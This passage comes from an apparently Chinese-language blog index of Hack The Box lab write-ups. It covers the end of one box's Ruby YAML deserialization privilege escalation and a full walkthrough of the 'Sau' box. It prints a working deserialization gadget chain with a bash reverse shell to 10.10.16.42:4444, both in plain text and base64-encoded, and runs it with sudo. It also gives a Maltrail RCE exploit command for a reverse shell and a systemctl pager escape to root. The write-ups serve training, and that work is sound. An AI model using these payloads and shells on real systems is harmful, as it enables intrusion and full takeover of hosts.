/opt/update_dependencies.rb\n\n成功执行了\n\n---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: &quot;abc&quot;      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module &#x27;Kernel&#x27;                 method_id: :system             git_set: /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.42/4444 0&gt;&amp;1&#x27;         method_id: :resolve\n\necho LS0tCi0gIXJ1Ynkvb2JqZWN0OkdlbTo6SW5zdGFsbGVyCiAgICBpOiB4Ci0gIXJ1Ynkvb2JqZWN0OkdlbTo6U3BlY0ZldGNoZXIKICAgIGk6IHkKLSAhcnVieS9vYmplY3Q6R2VtOjpSZXF1aXJlbWVudAogIHJlcXVpcmVtZW50czoKICAgICFydWJ5L29iamVjdDpHZW06OlBhY2thZ2U6OlRhclJlYWRlcgogICAgaW86ICYxICFydWJ5L29iamVjdDpOZXQ6OkJ1ZmZlcmVkSU8KICAgICAgaW86ICYxICFydWJ5L29iamVjdDpHZW06OlBhY2thZ2U6OlRhclJlYWRlcjo6RW50cnkKICAgICAgICAgcmVhZDogMAogICAgICAgICBoZWFkZXI6ICJhYmMiCiAgICAgIGRlYnVnX291dHB1dDogJjEgIXJ1Ynkvb2JqZWN0Ok5ldDo6V3JpdGVBZGFwdGVyCiAgICAgICAgIHNvY2tldDogJjEgIXJ1Ynkvb2JqZWN0OkdlbTo6UmVxdWVzdFNldAogICAgICAgICAgICAgc2V0czogIXJ1Ynkvb2JqZWN0Ok5ldDo6V3JpdGVBZGFwdGVyCiAgICAgICAgICAgICAgICAgc29ja2V0OiAhcnVieS9tb2R1bGUgJ0tlcm5lbCcKICAgICAgICAgICAgICAgICBtZXRob2RfaWQ6IDpzeXN0ZW0KICAgICAgICAgICAgIGdpdF9zZXQ6IC9iaW4vYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi80NDQ0IDA+JjEnCiAgICAgICAgIG1ldGhvZF9pZDogOnJlc29sdmU= |base64 -d &gt; dependencies.ymlsudo /usr/bin/ruby /opt/update_dependencies.rb\n\n收工\n\n\n50d0e33078e248e47949958ee1ae4164\n\n","categories":["HTB"],"tags":["pdfkit","CVE-2022-25765","Ruby反序列化"]},{"title":"HTB-Sau","url":"/post/56262cca040f/","content":"ip=&#x27;10.129.229.26&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n开了22,80,8338,55555端口\n\n\n类似一个dnslog，https://github.com/darklynx/request-baskets\n\n似乎有个CVE\n\nSSRF创建一个转发URL\n\n转到本地\n\n改成127就能访问内网\n\n\nMailTrail RCE\nhttps://github.com/spookier/Maltrail-v0.53-Exploit\n\n之前测试也证明能出网，所以直接弹shell\npython poc.py 10.10.16.42 9999 http://10.129.229.26:55555/sutrw65\n\n\n提权\n\ncat /etc/systemd/system/trail.service[Unit]Description=Maltrail. Server of malicious traffic detection systemDocumentation=https://github.com/stamparm/maltrail#readmeDocumentation=https://github.com/stamparm/maltrail/wikiRequires=network.targetBefore=maltrail-sensor.serviceAfter=network-online.target[Service]User=pumaGroup=pumaWorkingDirectory=/opt/maltrailExecStart=/usr/bin/python3 server.pyRestart=on-failureKillMode=mixed[Install]WantedBy=multi-user.target\n\nHTB提示systemctl版本号，看来提权从这里找\n\nsudo /usr/bin/systemctl status trail.service\n\n\nsystemctl 中有一个功能，如果终端窗口的大小小于任何输出行的长度，就会使用pager less来输出信息而不是使用cat。而Pager less可以执行命令\n\n把窗口调小一点执行命令就会触发，实际systemctl status输出基本都会比窗口大\n\n收工\n\n\n2e815d919a73c08f8c627f4d90f10f51\n\n","categories":["HTB"],"tags":["SSRF","MailTrail"]}]